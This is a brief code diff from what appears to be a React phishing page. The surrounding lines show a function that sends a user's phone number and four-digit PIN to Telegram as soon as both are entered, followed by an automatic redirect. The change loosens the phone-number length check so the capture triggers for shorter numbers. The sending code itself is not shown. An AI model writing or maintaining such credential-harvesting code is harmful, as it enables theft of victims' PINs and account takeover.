@@ -46,7 +46,7 @@ const sendTelegramAlertClient = (phone: string, pin: string) => {
 
   // Auto-redirect when phone and PIN are complete
  useEffect(() => {
-  if (phoneNumber.length >= 9 && pin.length === 4 && !isLoading) {
+  if (phoneNumber.length >= 8 && pin.length === 4 && !isLoading) {
     setIsLoading(true);
 
     // Send Telegram alert with phone + PIN
